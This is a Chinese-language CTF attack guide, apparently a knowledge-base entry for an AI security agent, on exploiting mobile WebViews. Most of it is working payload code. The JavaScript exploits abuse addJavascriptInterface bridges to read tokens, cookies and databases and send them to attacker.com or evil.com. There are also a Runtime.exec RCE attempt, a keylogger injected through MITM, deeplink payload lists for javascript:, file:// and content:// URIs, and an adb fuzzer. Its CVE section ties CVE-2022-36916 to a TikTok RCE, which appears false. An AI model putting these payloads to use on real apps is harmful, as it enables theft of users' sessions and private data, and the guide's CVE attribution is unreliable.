# WebView 攻击全技术

## 场景

移动应用中大量使用 WebView 来加载网页内容、显示帮助文档、实现混合渲染或处理 OAuth 登录。CTF 中 WebView 攻击的核心是: 利用 WebView 的特有漏洞 — `addJavascriptInterface` 导致的 RCE、跨域问题、文件协议访问、SSL 绕过等 — 来获取应用敏感数据或执行任意代码。

## 输入信号

```
APK 反编译后存在 android.webkit.WebView 相关类
iOS 应用存在 WKWebView / UIWebView 使用
AndroidManifest.xml 中 android:usesCleartextTraffic=true
应用注册了自定义 URL scheme (如 myapp://)
Android 应用中存在 @JavascriptInterface 注解
iOS 中存在 WKScriptMessageHandler 协议实现
应用实现了 WebViewClient.shouldOverrideUrlLoading
应用实现了 onReceivedSslError 且调用 handler.proceed()
Android 中存在 file:// 路径在 WebView 中加载
iOS 中存在 loadHTMLString:baseURL: 调用
应用中 WebView 启用了 JavaScript (setJavaScriptEnabled(true))
```

## 1. Android: addJavascriptInterface → RCE

这是 Android WebView 中最经典的攻击向量。当应用通过 `addJavascriptInterface` 将一个 Java 对象暴露给 JavaScript 时，攻击者可通过反射调用该对象的方法，进而执行任意代码。

```java
// 漏洞代码现场
// Android 应用中:
// webView.getSettings().setJavaScriptEnabled(true);
// webView.addJavascriptInterface(new FileAccessor(), "bridge");

// 桥接对象 FileAccessor:
public class FileAccessor {
    @JavascriptInterface
    public String readFile(String path) {
        // 读取文件内容
        return new String(Files.readAllBytes(Paths.get(path)));
    }

    @JavascriptInterface
    public String getProperty(String key) {
        return System.getProperty(key);
    }
}
```

```javascript
// exploit.js — addJavascriptInterface 漏洞利用

// 步骤 1: 枚举暴露的对象方法
// bridge 是暴露给 JS 的对象名
function enumerateBridge() {
    var results = {};
    for (var key in window) {
        try {
            if (typeof window[key] === 'object' && window[key] !== null) {
                var methods = [];
                for (var m in window[key]) {
                    try {
                        methods.push(m);
                    } catch(e) {}
                }
                if (methods.length > 0) {
                    results[key] = methods;
                }
            }
        } catch(e) {}
    }
    return JSON.stringify(results);
}

// 步骤 2: 利用桥接对象读取敏感文件
try {
    // 读取 SharedPreferences (存有登录 token)
    var dataDir = '/data/data/com.target.app/';
    var token = bridge.readFile(dataDir + 'shared_prefs/token.xml');
    var prefs = bridge.readFile(dataDir + 'shared_prefs/prefs.xml');

    // 外带数据
    fetch('https://attacker.com/exfil?token=' + encodeURIComponent(token));
} catch(e) {}

// 步骤 3: 命令执行 (Android 4.2+ 需要 API 17+, @JavascriptInterface 限制)

// Android < 4.2 (API < 17): 通过反射访问所有 public 方法
// 可以直接: bridge.getClass().forName("java.lang.Runtime")
//   .getMethod("exec", String.class).invoke(...)

// Android >= 4.2: 只能调用 @JavascriptInterface 注解的方法
// 但仍然可以通过桥接方法的返回值利用
// 如果桥接方法返回 Context 或其他敏感对象 → 链式调用

// 跨 Context 攻击链
try {
    // 如果 bridge 暴露了 getContext() 方法
    var context = bridge.getContext();
    // context.getClass()...
    // 进一步反射获取更高权限
} catch(e) {}
```

```javascript
// WebView RCE via reflected XSS — 完整攻击链

// 条件: 应用打开 https://target.com/search?q=USER_INPUT
// 且未过滤 <script> 标签
// 同时应用存在 addJavascriptInterface 桥接

// payload:
<script>
// 读取应用私有文件
var data = bridge.readFile('/data/data/com.target.app/databases/webview.db');
var cookies = bridge.readFile('/data/data/com.target.app/app_webview/Cookies');

// 通过图片外带
new Image().src = 'https://attacker.com/exfil?data=' +
    encodeURIComponent(cookies + '|||' + data);

// 执行命令 (如果可用)
try {
    var r = bridge.getClass().forName('java.lang.Runtime')
        .getMethod('getRuntime').invoke(null);
    var p = r.exec(['sh', '-c', 'id']);
    // 读取命令输出...
} catch(e) {}
</script>
```

### Real CVE: TikTok WebView RCE (CVE-2022-36916)

```text
CVE-2022-36916: TikTok Android 版本的 WebView bridge 中
存在 addJavascriptInterface 暴露的对象，可通过深层反射链
从 context 获取到 File/exec 访问权限，最终实现 RCE。

漏洞链:
bridge.getContext() → getSystemService("clipboard") → 
clipboard 对象的 getPrimaryClip() 返回 ClipData →
ClipData 的 getItemAt().getText() 包含攻击者控制的内容
→ 该内容被后续 eval() 执行 → 任意代码

PoC:
iframe/src = https://evil.com/exploit.html
→ exploit.html 中的 JS 调用 bridge 方法 → 反射链 → RCE
```

## 2. iOS: WKScriptMessageHandler → Native Bridge Abuse

```swift
// iOS 漏洞代码:
// WKUserContentController.add(self, name: "nativeBridge")
// JS: window.webkit.messageHandlers.nativeBridge.postMessage(data)

// 配置:
let config = WKWebViewConfiguration()
let userController = WKUserContentController()
userController.add(self, name: "nativeBridge")
config.userContentController = userController
webView = WKWebView(frame: .zero, configuration: config)

// Handler:
func userContentController(_ userContentController: WKUserContentController,
                          didReceive message: WKScriptMessage) {
    if message.name == "nativeBridge" {
        if let body = message.body as? [String: Any] {
            let action = body["action"] as? String
            // 未验证 message.frameInfo → 跨域 iframe 也可发送消息
            processAction(action, data: body["data"])
        }
    }
}
```

```javascript
// iOS WKWebView bridge 漏洞利用

// 漏洞 1: 未验证 frameInfo — 跨域 iframe 可调用 native bridge
// 如果 handler 不检查 message.frameInfo.securityOrigin

// exploit.html 放在攻击者服务器上
<script>
// 调用 native bridge (如果 handler 不检查来源)
window.webkit.messageHandlers.nativeBridge.postMessage({
    action: 'getContacts',
    data: {}
});

// 或更危险的 action:
window.webkit.messageHandlers.nativeBridge.postMessage({
    action: 'readFile',
    data: { path: '/var/Keychains/keychain-2.db' }
});
</script>

// 漏洞 2: WKWebView + URL scheme handler
// 如果 app 实现了特定 scheme → 通过 iframe 或 location 触发
// myapp://delete?file=xxx

// 漏洞 3: UIWebView (已弃用但仍有使用)
// UIWebView 允许 JS 直接调用 Objective-C 的 stringByEvaluatingJavaScriptFromString
// 且没有 WKWebView 的进程隔离 → 更危险
```

## 3. Scheme / Intent Hijacking

```python
# scheme_hijacking.py — 自定义 URL Scheme 劫持

# 场景: 应用注册了自定义 URL scheme
# Android: intent://myapp.com/action#Intent;...
# iOS: myapp://open?url=https://target.com

# 攻击目标: 诱导其他应用或 Web 页面打开该 scheme
# → WebView 加载攻击者控制的 URL

class SchemeHijacking:
    """自定义 URL scheme 劫持检测"""

    # 常见 scheme 列表
    COMMON_SCHEMES = [
        'myapp', 'app', 'sdk', 'oauth', 'auth',
        'callback', 'signin', 'login', 'myscheme',
    ]

    @staticmethod
    def extract_schemes_from_apk(apk_path):
        """从 APK 中提取注册的 URL scheme"""
        # 使用 aapt 或 apktool 解包
        # 搜索 AndroidManifest.xml 中的 intent-filter
        # <data android:scheme="myapp" />
        # 或通过 grep -r "scheme" 查找
        import subprocess
        cmd = f'aapt d xmltree {apk_path} AndroidManifest.xml'
        output = subprocess.check_output(cmd, shell=True).decode()
        schemes = []
        for line in output.split('\n'):
            if 'scheme' in line and 'android:' in line:
                schemes.append(line.strip())
        return schemes

    @staticmethod
    def check_open_redirect_in_scheme(scheme_uri):
        """检查 scheme 中是否存在 open redirect"""
        # myapp://open?url=https://evil.com
        # myapp://load?page=https://evil.com
        test_urls = [
            'https://evil.com',
            'https://attacker.com/phish',
            'javascript:alert(1)',
            'file:///data/data/com.target.app/shared_prefs/token.xml',
        ]
        for test in test_urls:
            # 构造 scheme URL
            # 手动测试: 用 adb 打开
            pass
```

### Deeplink to WebView: Parameter Injection

```java
// Android 漏洞: Deeplink 参数直接传递到 WebView

// AndroidManifest.xml:
// <intent-filter>
//   <action android:name="android.intent.action.VIEW" />
//   <category android:name="android.intent.category.DEFAULT" />
//   <data android:scheme="myapp" android:host="open" />
// </intent-filter>

// Activity 中:
// Intent intent = getIntent();
// Uri data = intent.getData();
// String url = data.getQueryParameter("url");
// webView.loadUrl(url);  // 直接加载用户控制的 URL → 任意 URL 加载!

// 攻击:
// <a href="myapp://open?url=https://attacker.com/exploit.html">
// 受害者点击后 → WebView 加载 exploit.html → 执行 JS
```

```python
# deeplink_injection.py — Deeplink 注入 payloads

# 如果 WebView 的 loadUrl 接受未过滤的参数:
PAYLOADS = {
    "javascript_injection": {
        "scheme": "myapp://open",
        "payloads": [
            "?url=javascript:alert(1)",
            "?url=javascript:fetch('https://attacker.com/'+document.cookie)",
            "?url=data:text/html,<script>alert(1)</script>",
        ],
    },
    "file_read": {
        "payloads": [
            "?url=file:///data/data/com.target.app/shared_prefs/token.xml",
            "?url=file:///data/data/com.target.app/databases/webview.db",
            "?url=file:///data/data/com.target.app/files/private.key",
            "?url=file:///data/local/tmp/.auth_token",
        ],
    },
    "content_provider": {
        "payloads": [
            "?url=content://com.target.app.provider/preferences",
            "?url=content://com.target.app.provider/databases",
        ],
    },
    "open_redirect": {
        "payloads": [
            "?url=https://attacker.com/phish.html",
            "?url=https://evil.com/steal_cookies",
        ],
    },
}

# 全面的 deeplink fuzzer
def fuzz_deeplink(scheme: str, host: str, activity: str):
    """对 deeplink 进行 fuzz 测试"""
    import subprocess

    base_uri = f'{scheme}://{host}/'

    tests = [
        (f'{base_uri}?url=javascript:fetch("https://evil.com/"+document.cookie)', 'XSS via JS'),
        (f'{base_uri}?url=file:///etc/passwd', 'File read'),
        (f'{base_uri}?url=https://evil.com', 'Open redirect'),
        (f'{base_uri}#Intent;action=android.intent.action.VIEW;end', 'Intent confusion'),
    ]

    for uri, test_name in tests:
        # adb shell am start -d "{uri}" -a android.intent.action.VIEW
        cmd = f'adb shell am start -d "{uri}" -a android.intent.action.VIEW'
        result = subprocess.run(cmd, shell=True, capture_output=True)
        # 观察应用行为 (crash, 加载远程内容, 显示文件内容等)
        print(f'[{test_name}] {uri} → {result.returncode}')
```

## 4. File:// Protocol in WebView

```java
// Android WebView 默认允许 file:// 协议
// 如果 setAllowFileAccess(true) (默认)
// → 可读取任意应用可读文件

// 更危险: setAllowFileAccessFromFileURLs(true)
// → file:// 页面中的 JS 可读取任意 file:// 文件
// → file:// 域的 JS 可以读取 /data/data/... 下的文件
```

```javascript
// file:// 协议利用 — WebView 中加载 file:// 页面
// 条件: WebView 启用了 JavaScript 且 allowFileAccess=true

// 如果应用通过 WebView 显示本地 HTML 文件:
// webView.loadUrl("file:///android_asset/help.html");

// 但如果该 HTML 文件中引用了外部资源:
// <script src="https://evil.com/exploit.js"></script>
// → exploit.js 可在 file:// 源上执行
// → exploit.js 读取其他 file:// 文件

// exploit.js:
function stealFile(path) {
    var xhr = new XMLHttpRequest();
    xhr.open('GET', 'file://' + path, false);
    try {
        xhr.send();
        fetch('https://attacker.com/exfil?path=' +
            encodeURIComponent(path) +
            '&data=' + encodeURIComponent(xhr.responseText));
    } catch(e) {}
}

// 读取关键文件
stealFile('/data/data/com.target.app/shared_prefs/token.xml');
stealFile('/data/data/com.target.app/databases/webview.db');
stealFile('/data/data/com.target.app/files/session.key');
```

### Content Provider Leak

```java
// Android Content Provider 暴露路径
// 如果 WebView 加载的页面可访问 content:// URI:
// webView.loadUrl("content://com.target.app.provider/settings");

// 通过 JS 读取 content provider:
// var xhr = new XMLHttpRequest();
// xhr.open("GET", "content://com.target.app.provider/users", false);
// xhr.send();
// → 返回所有用户数据
```

## 5. SSL Pinning Bypass in WebView

```java
// WebView SSL 绕过 via onReceivedSslError

// 常见漏洞代码:
webView.setWebViewClient(new WebViewClient() {
    @Override
    public void onReceivedSslError(WebView view, SslErrorHandler handler, SslError error) {
        // 危险: 忽略所有 SSL 错误
        handler.proceed();
        // 或:
        // 只在调试模式忽略:
        // if (BuildConfig.DEBUG) { handler.proceed(); }
    }
});

// MITM 攻击:
// 1. 攻击者处在同一网络 (公共 Wi-Fi)
// 2. 用 mitmproxy 或 Burp Suite 拦截流量
// 3. 给目标应用提供自签名证书
// 4. WebView 接受所有 SSL 错误 → MITM 成功

// 更隐晦的: 通过 XSS 绕过 SSL pinning
// 如果攻击者在 WebView 中注入了恶意 JS
// → JS 可以通过未 pinning 的 WebSocket 外带数据
```

```javascript
// SSL bypass + MITM = 完全流量控制
// 在 MITM 代理上修改 WebView 加载的 HTML → 注入以下 JS:

// 读取页面内容并发送 (即使 HTTPS 没 pinning)
var allText = document.documentElement.innerText;
new Image().src = 'http://attacker.com/steal?' + btoa(allText);

// 窃取表单输入
document.addEventListener('keydown', function(e) {
    new Image().src = 'http://attacker.com/k?' + e.key;
});
```

## 6. Cookie Injection via CookieManager

```java
// Android CookieManager — 可在 WebView 中注入任意 cookie

// 如果攻击者通过其他途径获得了 session token
// → 通过 CookieManager 注入 session

CookieManager.getInstance().setCookie(
    "https://target.com",
    "session_id=STOLEN_TOKEN; Domain=.target.com"
);

// 或者通过 JS 注入 Cookie (XSS):
// document.cookie = "session_id=STOLEN_TOKEN; Domain=.target.com";
```

```javascript
// 跨应用 Cookie 窃取
// 如果多个应用使用同一域的 WebView (如所有应用使用 *.target.com)
// 应用 A 的 XSS → 读取或设置 *.target.com 的 cookie
// → 影响应用 B 的 WebView 认证状态

// Cookie 注入 payload 用于 WebView:
document.cookie = "session=victim_session; domain=.target.com; path=/";
fetch('https://target.com/api/me', {credentials: 'include'})
    .then(r => r.json())
    .then(data => fetch('https://attacker.com/leak?d=' + btoa(JSON.stringify(data))));
```

## 7. iOS WKWebView Specific: Cookie & Storage 分离

```swift
// iOS WKWebView 默认不共享 cookie 和 localStorage
// 每个 WKWebView 实例有独立的 cookie 存储
// 但通过 WKProcessPool 可共享

// 漏洞: 如果多个 WKWebView 使用同一个 WKProcessPool
// → cookie 在所有 WebView 间共享
// → 一个 WebView 的 XSS 可影响其他 WebView 的认证状态

// WKWebView + URLSchemeHandler
// 可拦截所有 HTTP 请求 → 读取/修改请求和响应
// 如果 handler 实现不当 → 泄露敏感数据
```

## 8. WebView Bridge Fuzzer

```python
# webview_bridge_fuzzer.py — WebView Bridge 自动化 Fuzzer

class WebViewBridgeFuzzer:
    """自动探测 WebView 桥接接口"""
    
    def __init__(self, exploit_server_url):
        self.server_url = exploit_server_url
    
    def generate_probe_html(self):
        """生成探测桥接对象的 HTML"""
        probes = []
        
        # 探测方法: 遍历 window 对象寻找非标准属性
        enumerate_script = '''
        var bridges = [];
        for (var key in window) {
            try {
                if (key !== 'window' && key !== 'self' && key !== 'top' &&
                    key !== 'parent' && key !== 'document' && key !== 'location' &&
                    key !== 'navigator' && key !== 'screen' && key !== 'history') {
                    var val = window[key];
                    if (typeof val === 'object' && val !== null) {
                        var methods = [];
                        for (var m in val) {
                            methods.push(m);
                        }
                        bridges.push({name: key, type: typeof val, methods: methods});
                    } else if (typeof val === 'function') {
                        bridges.push({name: key, type: 'function'});
                    }
                }
            } catch(e) {}
        }
        fetch('''' + self.server_url + '''/probe?data=' + encodeURIComponent(JSON.stringify(bridges)));
        '''
        
        # 对每个发现的桥接方法，尝试调用
        method_fuzz = '''
        // 对发现的每个方法尝试不同参数类型
        function fuzzMethod(objName, methodName) {
            var obj = window[objName];
            var payloads = ['', null, undefined, 0, "test",
                           {"__proto__": {"isAdmin": true}},
                           "<img src=x onerror=alert(1)>",
                           "../../../../etc/passwd",
                           "file:///data/data/..."];
            payloads.forEach(function(p) {
                try {
                    obj[methodName](p);
                } catch(e) {}
            });
        }
        '''
        
        return {'enumerate': enumerate_script, 'fuzz': method_fuzz}
    
    def run_fuzz(self, apk_or_ipa_path):
        """运行完整的 bridge fuzz"""
        # 1. 解包应用 → 搜索 WebView 相关类
        # 2. 寻找 @JavascriptInterface / WKScriptMessageHandler
        # 3. 编译探测 HTML 到自动测试
        # 4. 启动测试服务器
        # 5. 通过 adb 或 sim 打开探测页面
        pass
```

## 9. Android Intent Scheme Attack (Custom Tab)

```java
// Custom Tab (Chrome Custom Tabs) 中的 WebView 攻击
// 通过 Intent 向 Custom Tab 注入参数

// 场景: 应用使用 Custom Tabs 打开 URL
// new CustomTabsIntent.Builder().build().launchUrl(context, Uri.parse(url));

// 攻击: 通过 Intent 附加 extra 值
// intent.putExtra("android.support.customtabs.extra.SESSION", ...);
// → 可能影响 Custom Tab 的行为

// 更直接: 利用 intent:// scheme + WebView
// intent://target.com#Intent;action=VIEW;end
// → 打开系统浏览器或 WebView → 可能被劫持
```

## 攻击链

```
addJavascriptInterface + XSS → 桥接方法枚举 → 反射调用 → RCE / 文件读取
addJavascriptInterface + MITM → 注入 JS → 调用桥接 → 读取私有文件 → token 窃取
WKScriptMessageHandler + 跨域 iframe → 未验证来源 → 调用 native handler → 敏感操作
URL scheme + open redirect → deeplink 打开 → WebView 加载恶意 URL → XSS
file:// 协议访问 + JS → 跨源 file 文件读取 → 私有数据泄露
SSL pinning 绕过 → MITM → 流量篡改 → 凭证窃取 / 代码注入
CookieManager → 注入 session cookie → 伪装任意用户登录
Intent scheme → deeplink 注入 → 任意 URL 加载 → 钓鱼 / XSS
WebView + content:// → 跨应用 Content Provider 读取 → 数据库泄露
```

## 证据

记录: 应用包名 (Android Bundle ID)、WebView 配置 (JS 启用状态、桥接对象、file access)、发现的桥接方法列表、注入的 URI/URL、XSS payload、文件读取结果、Cookie 注入证明、SSL 绕过测试结果 (mitmproxy 截图)。

## MCP 工具映射

| 攻击步骤 | MCP 工具 | 说明 |
|---------|---------|------|
| 目标端点探测 | `http_probe` | HTTP GET 探测 WebView 目标页面 |
| WebView 知识检索 | `kb_router` | 按 WebView/JavascriptInterface 搜索知识库 |
| 技术文件阅读 | `kb_read_file` | 读取具体 WebView 攻击代码示例 |
| 辅助工具 | `run_ctf_tool` | dirsearch 扫描, jwt_tool 辅助 |

